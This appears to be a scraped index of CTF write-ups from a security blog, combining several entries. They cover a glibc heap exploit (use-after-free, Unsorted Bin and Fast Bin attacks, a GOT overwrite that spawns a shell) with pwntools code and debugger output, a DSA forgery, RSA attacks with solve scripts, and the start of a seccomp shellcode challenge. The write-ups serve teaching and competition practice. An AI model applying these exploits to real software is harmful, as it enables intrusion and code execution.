as robot[index] != NULL. Let\u0026rsquo;s take a look at destroy_robot:\nvoiddestroy_robot() { intindex; longin_FS_OFFSET; charindex_str[5]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); puts(\"Provide robot\\'s slot:\"); read(0, index_str, 4); index =atoi(index_str); if((index \u0026lt;0) ||(4\u0026lt;index)) { puts(\"Slot is empty!\"); } elseif(check_robot_slot[index] ==0) { puts(\"robot doesn\\'t exist!\"); } else{ free(robots[index]); check_robot_slot[index] =0; number_robots =number_robots +-1; } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  Here the developer forgot to delete the pointer to the robot that has been destroyed. The developer only uses free, then sets check_robot_slot[index] = 0 and decrements number_robots, but robot[index] is still available.\nThis fact leads to a Use After Free (UAF) vulnerability since we can program a robot that is already destroyed. Let\u0026rsquo;s plan the exploit strategy:\n We can only allocate chunks bigger than 0x101 (Small Bin and Large Bin range) Since calloc does not use the Tcache, we cannot perform a Tcach poisoining attack. However, chunks sized less than 0x401 will go to the corresponding Tcache list when freed We are able to perform an Unsorted Bin attack since we have a UAF, so we can modify the bk pointer and write a fix value to an arbitrary address A good target for an Unsorted Bin attack is global_max_fast within Glibc. This will make all chunks behave like Fast Bins (which was not possible before) If we get the ability to allocate Fast Bins, we can perform a Fast Bin attack modifying the fd pointer of a freed chunk, but we will need to bypass somw mitigations A good target for the Fast Bin attack is the global array robots, because there we can set addresses of the Global Offset Table (GOT) Since the binary has Partial RELRO, we can perform a GOT overwrite to leak Glibc and call system(\u0026quot;/bin/sh\u0026quot;)  First, we start by creating two chunks:\n One chunk sized 0x418 Another chunk sized 0x108 (to prevent coalescing)  When we destroy the first chunk, we get an Unsorted Bin and thus we can modify the bk pointer to be the address of global_max_fast:\ndefmain(): p=get_process() gdb.attach(p, 'continue') create(p, 0x418) create(p, 0x108) destroy(p, 0) p.interactive() if__name__=='__main__': main()  In GDB, we will see this heap state:\n$ python3 solve.py [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1686163 [*] running in new terminal: ['/usr/bin/gdb', '-q', './main_patched', '1686163', '-x', '/tmp/pwnrhgmk3pf.gdb'] [+] Waiting for debugger: Done [*] Switching to interactive mode 1- Create a robot 2- Program a robot 3- Destroy a robot 4- Exit \u0026gt; $  pwndbg\u0026gt; vis_heap_chunks 0x405000 0x0000000000000000 0x0000000000000251 ........Q....... 0x405010 0x0000000000000000 0x0000000000000000 ................ 0x405020 0x0000000000000000 0x0000000000000000 ................ ... 0x405230 0x0000000000000000 0x0000000000000000 ................ 0x405240 0x0000000000000000 0x0000000000000000 ................ 0x405250 0x0000000000000000 0x0000000000000421 ........!....... \u0026lt;-- unsortedbin[all][0] 0x405260 0x00007ffff7dcdca0 0x00007ffff7dcdca0 ................ 0x405270 0x0000000000000000 0x0000000000000000 ................ 0x405280 0x0000000000000000 0x0000000000000000 ................ ... 0x405650 0x0000000000000000 0x0000000000000000 ................ 0x405660 0x0000000000000000 0x0000000000000000 ................ 0x405670 0x0000000000000420 0x0000000000000110 ............... 0x405680 0x0000000000000000 0x0000000000000000 ................ 0x405690 0x0000000000000000 0x0000000000000000 ................ ... 0x405770 0x0000000000000000 0x0000000000000000 ................ 0x405780 0x0000000000000000 0x0000000000020881 ................ \u0026lt;-- Top chunk pwndbg\u0026gt; bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x405250 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x405250 /* 'PR@' */ smallbins empty largebins empty pwndbg\u0026gt; p \u0026global_max_fast $1 = (size_t *) 0x7ffff7dcf940 \u0026lt;global_max_fast\u0026gt;  So we got an Unsorted Bin. Now, we can modify the bk pointer so that it points to global_max_fast. For the moment, I will disable ASLR, so that I only need to overwrite the last two bytes of the bk with f940:\nprogram(p, 0, p64(0) +p16(0xf940-0x10)) create(p, 0x418) destroy(p, 0)  Now we have modified global_max_fast:\npwndbg\u0026gt; x/gx \u0026global_max_fast 0x7ffff7dcf940 \u0026lt;global_max_fast\u0026gt;: 0x00007ffff7dcdca0 pwndbg\u0026gt; bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all[corrupted] FD: 0x405250 —▸ 0x7ffff7dcde40 (main_arena+512) ◂— 0x405250 /* 'PR@' */ BK: 0x7ffff7dcf930 (dumped_main_arena_end) ◂— 0x0 smallbins 0x1b0[corrupted] FD: 0x405250 —▸ 0x7ffff7dcde40 (main_arena+512) ◂— 0x405250 /* 'PR@' */ BK: 0x7ffff7dcde40 (main_arena+512) ◂— 0x7ffff7dcde40 largebins empty  However, as a drawback, we have corrupted the Unsorted Bin linked list, so any new chunk we try to allocate will crash the program:\n\u0026gt; $ 1 Provide robot memory size: $ 264 malloc(): memory corruption (fast)  But do you notice anything strange? We created a chunk sized 0x108 (264), and it is considered a Fast Bin. Hence, we have successfully modified global_max_fast.\nWe can overcome this issue by creating a chunk before performing the Unsorted Bin attack. Then, we can free that chunk to insert it into the Fast Bin and modify its fd pointer. However we need that address to pass some restrictions:\n The address must contain a valid size for the chunk we are \u0026ldquo;restoring\u0026rdquo; The previous size field must match with the previous chunk size  If we take a look at robot_memory_size, we will see this:\npwndbg\u0026gt; x/30gx \u0026robot_memory_size 0x4040c0 \u0026lt;robot_memory_size\u0026gt;: 0x0000010800000418 0x0000000000000000 0x4040d0 \u0026lt;robot_memory_size+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4040e0 \u0026lt;check_robot_slot\u0026gt;: 0x0000000100000000 0x0000000000000000 0x4040f0 \u0026lt;check_robot_slot+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404100 \u0026lt;robots\u0026gt;: 0x0000000000405260 0x0000000000405680 0x404110 \u0026lt;robots+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404120 \u0026lt;robots+32\u0026gt;: 0x0000000000000000 0x0000000000000001 0x404130: 0x0000000000000000 0x0000000000000000 0x404140: 0x0000000000000000 0x0000000000000000 0x404150: 0x0000000000000000 0x0000000000000000 0x404160: 0x0000000000000000 0x0000000000000000 0x404170: 0x0000000000000000 0x0000000000000000 0x404180: 0x0000000000000000 0x0000000000000000 0x404190: 0x0000000000000000 0x0000000000000000 0x4041a0: 0x0000000000000000 0x0000000000000000  Actually, if we create a third chunk, the size will be stored at robot_memory_size, and the previous chunk field will be 0x418. Hence, we can create two chunks sized 0x418 and the third one sized 0x421, that will act as a barrier to prevent coalescing and also will be useful to pass the Fast Bin size check:\ndefmain(): p=get_process() gdb.attach(p, 'continue') create(p, 0x418) create(p, 0x418) create(p, 0x421) destroy(p, 0) program(p, 0, p64(0) +p16(0xf940-0x10)) create(p, 0x418) destroy(p, 0) p.interactive() if__name__=='__main__': main()  pwndbg\u0026gt; x/30gx \u0026robot_memory_size 0x4040c0 \u0026lt;robot_memory_size\u0026gt;: 0x0000041800000418 0x0000000000000421 0x4040d0 \u0026lt;robot_memory_size+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4040e0 \u0026lt;check_robot_slot\u0026gt;: 0x0000000100000000 0x0000000000000001 0x4040f0 \u0026lt;check_robot_slot+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404100 \u0026lt;robots\u0026gt;: 0x0000000000405260 0x0000000000405680 0x404110 \u0026lt;robots+16\u0026gt;: 0x0000000000405aa0 0x0000000000000000 0x404120 \u0026lt;robots+32\u0026gt;: 0x0000000000000000 0x0000000000000002 0x404130: 0x0000000000000000 0x0000000000000000 0x404140: 0x0000000000000000 0x0000000000000000 0x404150: 0x0000000000000000 0x0000000000000000 0x404160: 0x0000000000000000 0x0000000000000000 0x404170: 0x0000000000000000 0x0000000000000000 0x404180: 0x0000000000000000 0x0000000000000000 0x404190: 0x0000000000000000 0x0000000000000000 0x4041a0: 0x0000000000000000 0x0000000000000000 pwndbg\u0026gt; heap Allocated chunk | PREV_INUSE Addr: 0x405000 Size: 0x251 Free chunk (unsortedbin) | PREV_INUSE Addr: 0x405250 Size: 0x421 fd: 0x7ffff7dcde40 bk: 0x00 Allocated chunk | PREV_INUSE Addr: 0x405670 Size: 0x421 Allocated chunk | PREV_INUSE Addr: 0x405a90 Size: 0x431 Top chunk | PREV_INUSE Addr: 0x405ec0 Size: 0x20141  This is what I mean. We have a Fast Bin at index 1, we will free it and modify the fd pointer to robot_memory_size. We will pass the size check because we have 0x421 at that address, and the previous chunk field will be 0x418, which coincides with the previous chunk on the heap layout. So everything will work smoothly:\ndestroy(p, 1) program(p, 1, p64(elf.sym.robot_memory_size)) create(p, 0x418) create(p, 0x418)  pwndbg\u0026gt; x/30gx \u0026robot_memory_size 0x4040c0 \u0026lt;robot_memory_size\u0026gt;: 0x0000041800000418 0x0000000000000421 0x4040d0 \u0026lt;robot_memory_size+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4040e0 \u0026lt;check_robot_slot\u0026gt;: 0x0000000100000000 0x0000000000000000 0x4040f0 \u0026lt;check_robot_slot+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404100 \u0026lt;robots\u0026gt;: 0x0000000000000000 0x00000000004040d0 0x404110 \u0026lt;robots+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404120 \u0026lt;robots+32\u0026gt;: 0x0000000000000000 0x0000000000000001 0x404130: 0x0000000000000000 0x0000000000000000 0x404140: 0x0000000000000000 0x0000000000000000 0x404150: 0x0000000000000000 0x0000000000000000 0x404160: 0x0000000000000000 0x0000000000000000 0x404170: 0x0000000000000000 0x0000000000000000 0x404180: 0x0000000000000000 0x0000000000000000 0x404190: 0x0000000000000000 0x0000000000000000 0x4041a0: 0x0000000000000000 0x0000000000000000  At this point, we have robots[1] pointing to 0x4040d0, so we can start messing around these global variables and set the values we want. For instance, we will put a 1 at check_robot_slot and put some GOT entries at robots:\nprogram(p, 1, p64(0x1000) +p64(0) +p32(1) *5+p64(0) +p32(0) + p64(elf.got.free) +p64(elf.got.atoi) +p64(elf.got.atoi))  With this, we can modify the GOT entry of free and set it to puts, so that we can leak atoi within Glibc at runtime by calling destroy(p, 2):\nprogram(p, 0, p64(elf.plt.puts)) destroy(p, 2) atoi_addr=u64(p.recvline().strip().ljust(8, b'\\0')) glibc.address=atoi_addr-glibc.sym.atoi log.success(f'Glibc base address: {hex(glibc.address)}')  $ python3 solve.py [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1712644 [*] running in new terminal: ['/usr/bin/gdb', '-q', './main_patched', '1712644', '-x', '/tmp/pwn_ozbkaaz.gdb'] [+] Waiting for debugger: Done [+] Glibc base address: 0x7ffff79e2000 [*] Switching to interactive mode 1- Create a robot 2- Program a robot 3- Destroy a robot 4- Exit \u0026gt; $  Alright, we have sucessfully leaked Glibc. Now we can modify the GOT again and set atoi to be system, so that, instead of entering a number for the menu, we can type sh and get a shell (we only can write up to 4 bytes, so sh is enough):\nprogram(p, 1, p64(glibc.sym.system)) p.sendlineafter(b'\u0026gt; ', b'sh') p.interactive()  $ python3 solve.py [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1714210 [+] Glibc base address: 0x7ffff79e2000 [*] Switching to interactive mode $ ls ld-linux-x86-64.so.2 libc.so.6 main main_patched solve.py  Perfect. The only thing left is to enable ASLR. This will make the exploit to work an average of 1 out of 16 attempts, due to the fact that we are modifying global_max_fast with a partial overwrite of two bytes, and ASLR affects one of the nibbles involved (4 bits):\n$ while true; do python3 solve.py 2\u0026gt;/dev/null; done [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1719491 [*] Process './main_patched' stopped with exit code -11 (SIGSEGV) (pid 1719491) [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1719497 [*] Process './main_patched' stopped with exit code -11 (SIGSEGV) (pid 1719497) ... [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1719600 [*] Process './main_patched' stopped with exit code -11 (SIGSEGV) (pid 1719600) [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1719606 [+] Glibc base address: 0x7f3744bd2000 [*] Switching to interactive mode $ ls ld-linux-x86-64.so.2 libc.so.6 main main_patched solve.py  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/other/robot-factory/","section":"ctf","summary":"BlackHat MEA CTF 2022. 64-bit binary. Heap exploitation. Unsorted Bin attack. Fast Bin attack. GOT overwrite","time":10,"title":"Robot Factory"},{"contents":"We are given the source code of a server that runs a Digital Signature Algorithm (DSA):\nfromCrypto.Util.numberimportgetPrime, isPrime, inverse fromhashlibimportsha256 fromrandomimportrandrange q, g=0, 2 whilenotisPrime(p:=2*q+1) orpow(g, q, p) !=1: q=getPrime(256) x=randrange(2, q) y=pow(g, x, p) defH(m): returnint.from_bytes(sha256(m).digest(), 'big') defsign(m): k=randrange(2, q) r=pow(g, k, p) %q s=(H(m) +r*x) *inverse(k, q) %q returnr, s defverify(m, r, s): u=inverse(s, q) returnpow(g, u*H(m), p) *pow(y, u*r, p) %p%q==r defmain(): print(\"Hello admin, here are the parameters!\") print('p =', p) print('y =', y) print(\"Please sign a message to retrieve your flag:\") m=bytes.fromhex(input('m = ')) r=int(input('r = ')) s=int(input('s = ')) ifnotverify(m, r, s): print(\"I've called the cops!\") exit() ifm!=b\"I'm the admin and I'd like to get my flag.\": print(\"Who are you??\") exit() print(\"Verification successful! Here is your flag: \", end='') withopen('flag.txt', 'r') asfile: print(file.read(), flush=True) if__name__=='__main__': main()  We are only able to enter a message $m$ and its signature $(r, s)$. However, we can\u0026rsquo;t get a legitimate $(r, s)$ signature because we don\u0026rsquo;t know the private key $x$.\nThe DSA implementation is correct but for the use of inverse from Crypto.Util.number. In fact, inverse(0, q) and inverse(q, q) return 0, which is mathematically incorrect since $0^{-1} \\pmod{q}$ is not defined ($0$ does not belong to $Z_q^*$, the multiplicative group modulo $q$):\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import inverse \u0026gt;\u0026gt;\u0026gt; q = 17 \u0026gt;\u0026gt;\u0026gt; inverse(0, q) 0 \u0026gt;\u0026gt;\u0026gt; inverse(q, q) 0 \u0026gt;\u0026gt;\u0026gt; pow(0, -1, q) Traceback (most recent call last): File \"\u0026lt;stdin\u0026gt;\", line 1, in \u0026lt;module\u0026gt; ValueError: base is not invertible for the given modulus \u0026gt;\u0026gt;\u0026gt; pow(q, -1, q) Traceback (most recent call last): File \"\u0026lt;stdin\u0026gt;\", line 1, in \u0026lt;module\u0026gt; ValueError: base is not invertible for the given modulus  With this issue of inverse (instead of using the built-in pow function), we can set s = 0 so that:\n u = inverse(s, q) = 0 Then pow(g, u * H(m), p) is pow(g, 0, p) = 1 As well as pow(y, u * r, p) is pow(y, 0, p) = 1 So pow(g, u * H(m), p) * pow(y, u * r, p) % p % q = 1  Therefore, we must send r = 1.\nIn order to get the flag, we must send the message \u0026quot;I'm the admin and I'd like to get my flag.\u0026quot; in hexadecimal format. Let\u0026rsquo;s do it:\n$ echo -n \"I'm the admin and I'd like to get my flag.\" | xxd -p | tr -d \\\\n 49276d207468652061646d696e20616e6420492764206c696b6520746f20676574206d7920666c61672e $ nc 031337.xyz 42050 Hello admin, here are the parameters! p = 130075297914599005878561792472990971963858978284996116362111109771454513001167 y = 84075133818892653193774942063986755752314541683015608384614923289226921999657 Please sign a message to retrieve your flag: m = 49276d207468652061646d696e20616e6420492764206c696b6520746f20676574206d7920666c61672e r = 1 s = 0 Verification successful! Here is your flag: ictf{TH15_I5_TH3_R34S0N}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/rolled-my-own-crypto/","section":"ctf","summary":"ImaginaryCTF 04/09/2022. 90 points. DSA. Abusing special values","time":3,"title":"Rolled my own Crypto"},{"contents":"We are given a host to connect to. It shows the source code used to encrypt the flag:\n$ nc puzzler7.imaginaryctf.org 3000 ================================================================================  #!/usr/bin/env python3 fromCrypto.Util.numberimport* classRotator: QUEUE_LENGTH=10 def__init__(self): self.e=65537 self.m=bytes_to_long(open('flag.txt', 'rb').read()) self.queue=[getPrime(512) foriinrange(self.QUEUE_LENGTH)] defget_new_primes(self): ret=self.queue[-2:] self.queue.pop() while(len(self.queue) \u0026lt;self.QUEUE_LENGTH): self.queue=[getPrime(512)] +self.queue returntuple(ret) defenc_flag(self): p, q=self.get_new_primes() n=p*q print(f\"Public key: {(n, self.e)}\") print(f\"Your encrypted flag: {pow(self.m, self.e, n)}\") rot=Rotator() print('='*80) print(open(__file__).read()) print('='*80) whileTrue: inp=input(\"Would you like an encrypted flag (y/n)? \") if'y'ininp.lower(): rot.enc_flag() print() else: break  ================================================================================ Would you like an encrypted flag (y/n)? ^C  The encryption type is RSA, but the implementation is wrong. The way to obtain the two prime numbers $p$ and $q$ is using a list of 10 prime numbers. The problem is that it uses primes #9 and #10, removes the last prime number from the list and adds a new one at the start.\nHence, if we encrypt the flag again, the current primes #9 and #10 are the old #8 and #9. As a result, the two modulus $n_1$ and $n_2$ have a common prime factor, so we can find it using the Greatest Common Divisor (GCD):\n$ nc puzzler7.imaginaryctf.org 3000 ================================================================================ ... ================================================================================ Would you like an encrypted flag (y/n)? y Public key: (96703909946448187810080059928860289847334838421345682013476154093401516765135280790240748288018738898773300957888698818329609720254183468520955600410824182661260651475354846583794678409061342257380126990919258631778574644009046899146628324485287628710454832937953442848153274308105256237934059406671514368669, 65537) Your encrypted flag: 59178952773280983701929213365655160414345333604813929581573406427317973306869828507777582501496996849288063597376183280909545034065032431890181707370065107503683394760116243008932175061294230315842811989143511271380367848125619781509436529057342192685755008501371415788491821709728063365374407957399759308403 Would you like an encrypted flag (y/n)? y Public key: (67521112267846681759399501276451660075611114138321414686289669627378193951857898222612601048796706669289048949898237532495727093603797701087528981834411985551974275328675230434122883600996218065032476293749234911283805641424141314863236316629221906963122154907092242556815579427166899630607780645315510611627, 65537) Your encrypted flag: 17472971162377108034479702090513254186993682961319105294905663470809265628036722391463644486154580853360833837492388701203988503690522100670413712708369683451190130374033333827066594624190360243317258296768874842826927768445323829689267057977209895049163051260509473831629782589375685789931957272431150099185 Would you like an encrypted flag (y/n)? ^C  $ python3 -q \u0026gt;\u0026gt;\u0026gt; import math \u0026gt;\u0026gt;\u0026gt; math.gcd( ... 96703909946448187810080059928860289847334838421345682013476154093401516765135280790240748288018738898773300957888698818329609720254183468520955600410824182661260651475354846583794678409061342257380126990919258631778574644009046899146628324485287628710454832937953442848153274308105256237934059406671514368669, ... 67521112267846681759399501276451660075611114138321414686289669627378193951857898222612601048796706669289048949898237532495727093603797701087528981834411985551974275328675230434122883600996218065032476293749234911283805641424141314863236316629221906963122154907092242556815579427166899630607780645315510611627 ... ) 9363717537480322078371747028261742962030931062610359488017319347844327325330269179209776316998302502579512167515356510999614768902498349936434046242471613  There it is. Now that we have one prime number, we can find the other one using integer division on $n_1$ and decrypt the RSA encryption in the conventional way. This is the solution script in Python:\n#!/usr/bin/env python3 frommathimportgcd frompwnimportremote defmain(): r=remote('puzzler7.imaginaryctf.org', 3000) r.sendlineafter(b'Would you like an encrypted flag (y/n)? ', b'y') r.recvuntil(b'Public key: ') n1, e =eval(r.recvline().decode()) r.recvuntil(b'Your encrypted flag: ') c =int(r.recvline().decode()) r.sendlineafter(b'Would you like an encrypted flag (y/n)? ', b'y') r.recvuntil(b'Public key: ') n2, _=eval(r.recvline().decode()) r.close() p=gcd(n1, n2) q=n1//p phi_n=(p-1) *(q-1) d=pow(e, -1, phi_n) m=pow(c, d, n1) print(bytes.fromhex(hex(m)[2:]).decode()) if__name__=='__main__': main()  And we obtain the flag:\n$ python3 solve.py [+] Opening connection to puzzler7.imaginaryctf.org on port 3000: Done [*] Closed connection to puzzler7.imaginaryctf.org port 3000 ictf{why_would_I_throw_away_perfectly_good_primes?}  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/rotating-secret-assembler/","section":"ctf","summary":"ImaginaryCTF 05/07/2022. 50 points. RSA. Greatest Common Divisor","time":2,"title":"Rotating Secret Assembler"},{"contents":"We are given these numbers:\ne: 3 c: 174422460809195453539354885823735245900172562989776845322302 n: 245841236512478852752909734912575581815967630033049838269083  We have the exponent $e$, the modulus $n$ and the ciphertext $c$.\nIt is clear that we have an RSA cryptosystem. Let\u0026rsquo;s review how RSA works:\nTwo prime numbers $p$ and $q$ are chosen so that we have the modulus $n = p \\cdot q$. Then an exponent $e$ is chosen (usually 3 or 65537) so that it is coprime with $\\phi(n) = (p - 1) \\cdot (q - 1)$.\nIn order to encrypt a message $m$ (in numeric format), this operation must be performed:\n$$ c = m ^ e \\pmod{n} $$\nSo that $c$ is the ciphertext. And to decrypt the ciphertext, we must first calculate $d = e ^ {-1} \\pmod{\\phi(n)}$ and then compute this:\n$$ m = c ^ d \\pmod{n} $$\nAt this point, the public key is the set ${e, n}$, whereas the private key is formed by ${p, q}$.\nThe RSA cryptosystem will be robust as far as the modulus $n$ is difficult to factorize. Otherwise, one could compute $p$ and $q$ from $n$ and therefore compute $\\phi(n)$ and $d$.\nThis time, the modulus $n$ we have is relatively short, so we might be able to factorize it. For that purpose, we can go to factordb.com and introduce the modulus:\nNow that we have $p$ and $q$, we can use Python to compute $\\phi(n)$ and $d$. And finally, compute the message $m$:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; e = 3 \u0026gt;\u0026gt;\u0026gt; c = 174422460809195453539354885823735245900172562989776845322302 \u0026gt;\u0026gt;\u0026gt; n = 245841236512478852752909734912575581815967630033049838269083 \u0026gt;\u0026gt;\u0026gt; p = 416064700201658306196320137931 \u0026gt;\u0026gt;\u0026gt; q = 590872612825179551336102196593 \u0026gt;\u0026gt;\u0026gt; phi_n = (p - 1) * (q - 1) \u0026gt;\u0026gt;\u0026gt; d = pow(e, -1, phi_n) \u0026gt;\u0026gt;\u0026gt; m = pow(c, d, n) \u0026gt;\u0026gt;\u0026gt; hex(m) '0x4354466c6561726e7b7273345f69735f61773373306d337d'  Remember that the message is in numeric format, so we must decode it as ASCII bytes:\n\u0026gt;\u0026gt;\u0026gt; bytes.fromhex('4354466c6561726e7b7273345f69735f61773373306d337d') b'CTFlearn{rs4_is_aw3s0m3}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/rsa-beginner/","section":"ctf","summary":"RSA. Factorization attack","time":2,"title":"RSA Beginner"},{"contents":"We are given these numbers:\ne: 1 c: 108193852288406505568171818194994500452464483136775497973720445 n: 1522605027922533360535618378132637429718068114961380688657908494580122963258952897654000350692006139  We have the exponent $e$, the modulus $n$ and the ciphertext $c$.\nIt is clear that we have an RSA cryptosystem. Let\u0026rsquo;s review how RSA works:\nTwo prime numbers $p$ and $q$ are chosen so that we have the modulus $n = p \\cdot q$. Then an exponent $e$ is chosen (usually 3 or 65537) so that it is coprime with $\\phi(n) = (p - 1) \\cdot (q - 1)$.\nIn order to encrypt a message $m$ (in numeric format), this operation must be performed:\n$$ c = m ^ e \\pmod{n} $$\nSo that $c$ is the ciphertext. And to decrypt the ciphertext, we must first calculate $d = e ^ {-1} \\pmod{\\phi(n)}$ and then compute this:\n$$ m = c ^ d \\pmod{n} $$\nAt this point, the public key is the set ${e, n}$, whereas the private key is formed by ${p, q}$.\nThis time, the exponent $e = 1$, so $d = 1$ as well, because it is the multiplicative inverse (1 is the identity element over the multiplication). Hence, $m = c$.\nThe only thing we need to do is decode the message $m$ from number to ASCII bytes:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; bytes.fromhex('108193852288406505568171818194994500452464483136775497973720445') b'CTFlearn{b3tter_up_y0ur_e}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/rsa-noob/","section":"ctf","summary":"RSA. Wrong implementation","time":1,"title":"RSA Noob"},{"contents":"We are given a Python script and we are told to run it:\n$ python3 runme.py picoCTF{run_s4n1ty_run}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/general-skills/runme.py/","section":"ctf","summary":"Beginner picoMini 2022. 100 points. Run Python script","time":1,"title":"runme.py"},{"contents":"We are given a 64-bit binary called chall:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  Static code analysis We also have the original C source code (chall.c):\n#include\u0026lt;errno.h\u0026gt; #include\u0026lt;error.h\u0026gt; #include\u0026lt;fcntl.h\u0026gt; #include\u0026lt;seccomp.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;sys/mman.h\u0026gt; #include\u0026lt;sys/syscall.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; #defineSIZE0x100 // http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A\u0026amp;arch=x86-64\u0026amp;as_format=inline#assembly #defineHEADER\"\\x48\\x31\\xc0\\x48\\x89\\xe7\\x48\\x81\\xe7\\x00\\xf0\\xff\\xff\\x48\\x81\\xef\\x00\\x20\\x00\\x00\\x48\\xc7\\xc1\\x00\\x06\\x00\\x00\\xf3\\x48\\xab\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xe4\\x48\\x31\\xed\\x48\\x31\\xf6\\x48\\x31\\xff\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff\" #defineFLAG_SIZE64 charflag[FLAG_SIZE]; voidload_flag() { intfd; if((fd =open(\"flag.txt\", O_RDONLY)) ==-1) error(EXIT_FAILURE, errno, \"open flag\"); if(read(fd, flag, FLAG_SIZE) ==-1) error(EXIT_FAILURE, errno, \"read flag\"); if(close(fd) ==-1) error(EXIT_FAILURE, errno, \"close flag\"); } voidsetup() { scmp_filter_ctx ctx; ctx =seccomp_init(SCMP_ACT_KILL); intret =0; if(ctx !=NULL) { ret |=seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1, SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO)); ret |=seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); ret |=seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); ret |=seccomp_load(ctx); } seccomp_release(ctx); if(ctx ==NULL||ret) error(EXIT_FAILURE, 0, \"seccomp\"); } intmain() { setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); load_flag(); puts(\"Welcome to Shellcode as a Service!\"); void*addr =mmap(NULL, 0x1000, PROT_EXEC |PROT_READ |PROT_WRITE, MAP_PRIVATE |MAP_ANON, -1, 0); memcpy(addr, HEADER, sizeof(HEADER)); read(0, addr +sizeof(HEADER) -1, SIZE); setup(); goto*addr; }  We see that the main function loads the flag in a global variable called flag using function load_flag, then it prepares a memory region to let us enter low-level instructions that will be executed. However, before running our code, the program adds seccomp rules in setup.\nAnalyzing seccomp rules Using seccomp-tools we can find which syscall instructions we are allowed to use:\n$ seccomp-tools dump ./chall Welcome to Shellcode as a Service! asdf line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0b 0xc000003e if (A != ARCH_X86_64) goto 0013 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x08 0xffffffff if (A != 0xffffffff) goto 0013 0005: 0x15 0x06 0x00 0x0000003c if (A == exit) goto 0012 0006: 0x15 0x05 0x00 0x000000e7 if (A == exit_group) goto 0012 0007: 0x15 0x00 0x05 0x00000001 if (A != write) goto 0013 0008: 0x20 0x00 0x00 0x00000014 A = fd \u0026gt;\u0026gt; 32 # write(fd, buf, count) 